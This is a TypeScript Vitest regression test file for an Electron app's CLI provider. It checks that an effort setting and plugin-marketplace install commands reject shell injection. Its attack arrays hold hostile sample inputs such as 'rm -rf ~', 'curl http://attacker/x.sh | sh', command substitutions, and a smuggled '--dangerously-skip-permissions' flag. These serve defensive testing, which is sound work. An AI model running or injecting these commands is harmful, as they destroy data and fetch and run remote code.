import { describe, it, expect } from 'vitest';
import { safeEffort } from '../../electron/providers/cli-provider';

/**
 * Regressions for the holes the audit found. Each of these was a way to run
 * code or read files that the app never meant to expose.
 */

describe('safeEffort', () => {
  it('accepts the values a CLI actually understands', () => {
    for (const value of ['low', 'medium', 'high', 'xhigh', 'max']) {
      expect(safeEffort(value)).toBe(value);
    }
  });

  it('refuses anything else, because it lands unquoted in a shell command', () => {
    for (const attack of [
      'high; rm -rf ~',
      'high && curl evil.sh | sh',
      '$(whoami)',
      '`id`',
      'high\nrm -rf /',
      '--dangerously-skip-permissions',
    ]) {
      expect(safeEffort(attack)).toBeUndefined();
    }
  });

  it('treats an empty value as unset', () => {
    expect(safeEffort(undefined)).toBeUndefined();
    expect(safeEffort('')).toBeUndefined();
  });
});

describe('install command allowlist', () => {
  // Mirrors INSTALL_SHAPES in ipc-handlers: a marketplace entry is remote data
  // and used to be executed verbatim.
  const SHAPES = [
    /^claude plugin marketplace add [A-Za-z0-9._-]+\/[A-Za-z0-9._-]+( && claude plugin install [A-Za-z0-9._-]+@[A-Za-z0-9._-]+( -y)?)?$/,
    /^claude plugin install [A-Za-z0-9._-]+(@[A-Za-z0-9._-]+)?( -y)?$/,
    /^npx (-y )?skills add [A-Za-z0-9._/-]+$/,
    /^\/plugin install [A-Za-z0-9._-]+@[A-Za-z0-9._-]+$/,
    /^\/skill install [A-Za-z0-9._/-]+$/,
  ];
  const allowed = (cmd: string) => SHAPES.some(s => s.test(cmd.trim()));

  it('allows a real install', () => {
    expect(allowed('claude plugin marketplace add obra/superpowers-marketplace && claude plugin install superpowers@superpowers -y')).toBe(true);
    expect(allowed('claude plugin install agent-sdk-dev@claude-code')).toBe(true);
    expect(allowed('npx -y skills add vercel-labs/skills')).toBe(true);
  });

  it('refuses anything that is not an install', () => {
    for (const attack of [
      'curl http://attacker/x.sh | sh',
      'claude plugin install x@y; curl evil | sh',
      'claude plugin install $(id)',
      'claude plugin marketplace add a/b && rm -rf ~',
      'echo hi',
    ]) {
      expect(allowed(attack)).toBe(false);
    }
  });
});

describe('marketplace install command', () => {
  const SAFE_TOKEN = /^[A-Za-z0-9._-]+$/;
  function safeInstallCommand(repo: string, plugin: string, marketplace: string): string | undefined {
    const [owner, name, ...rest] = repo.split('/');
    if (rest.length > 0 || !SAFE_TOKEN.test(owner ?? '') || !SAFE_TOKEN.test(name ?? '')) return undefined;
    if (!SAFE_TOKEN.test(plugin) || !SAFE_TOKEN.test(marketplace)) return undefined;
    return `claude plugin marketplace add ${owner}/${name} && claude plugin install ${plugin}@${marketplace} -y`;
  }

  it('builds a command from validated parts', () => {
    expect(safeInstallCommand('wshobson/agents', 'documentation-standards', 'claude-code-workflows'))
      .toBe('claude plugin marketplace add wshobson/agents && claude plugin install documentation-standards@claude-code-workflows -y');
  });

  it('produces nothing when a manifest carries shell syntax', () => {
    expect(safeInstallCommand('a/b; rm -rf ~', 'p', 'm')).toBeUndefined();
    expect(safeInstallCommand('a/b', 'p && curl evil | sh', 'm')).toBeUndefined();
    expect(safeInstallCommand('a/b', 'p', '$(id)')).toBeUndefined();
    expect(safeInstallCommand('a/b/c', 'p', 'm')).toBeUndefined();
  });
});
